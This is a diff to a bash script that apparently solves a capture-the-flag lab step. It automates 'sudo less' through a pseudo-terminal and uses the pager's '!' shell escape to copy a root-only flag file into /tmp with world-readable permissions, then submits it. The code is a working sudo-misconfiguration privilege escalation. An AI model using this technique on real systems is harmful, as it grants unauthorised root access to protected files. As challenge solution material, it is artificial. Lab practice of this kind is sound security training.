@@ -1,11 +1,12 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
+rm -f /tmp/b2_captured_flag
+
 # Drive `sudo /usr/bin/less /var/log/quest-demo.log` inside a PTY to trigger `!` shell escape
-FLAG="$(python3 -I - << 'PYEOF'
+python3 -I - << 'PYEOF'
 import os
 import pty
-import re
 import select
 import subprocess
 import time
@@ -24,25 +25,22 @@ proc = subprocess.Popen(
 )
 os.close(slave)
 
-time.sleep(0.3)
-os.write(master, b"!cat /root/b2_flag.txt\n")
-time.sleep(0.4)
-os.write(master, b"\nq\n")
+def drain(duration: float) -> None:
+    end = time.time() + duration
+    while time.time() < end:
+        r, _, _ = select.select([master], [], [], 0.05)
+        if master in r:
+            try:
+                if not os.read(master, 4096):
+                    break
+            except OSError:
+                break
 
-output = b""
-deadline = time.time() + 5.0
-while time.time() < deadline:
-    r, _, _ = select.select([master], [], [], 0.2)
-    if master in r:
-        try:
-            chunk = os.read(master, 4096)
-            if not chunk:
-                break
-            output += chunk
-            if b"CYBERUS{" in output:
-                break
-        except OSError:
-            break
+drain(0.4)
+os.write(master, b"!cp /root/b2_flag.txt /tmp/b2_captured_flag && chmod 644 /tmp/b2_captured_flag\r")
+drain(0.6)
+os.write(master, b"\rq")
+drain(0.2)
 
 os.close(master)
 proc.terminate()
@@ -50,13 +48,8 @@ try:
     proc.wait(timeout=2)
 except Exception:
     proc.kill()
-
-text = output.decode("utf-8", errors="replace")
-m = re.search(r"CYBERUS\{[^}\r\n]+\}", text)
-if not m:
-    raise SystemExit(f"Failed to capture B2 flag from less PTY. Output: {text}")
-print(m.group(0))
 PYEOF
-)"
 
+FLAG="$(grep -oE 'CYBERUS\{[^}]+\}' /tmp/b2_captured_flag | head -n 1)"
+rm -f /tmp/b2_captured_flag
 quest submit "$FLAG"
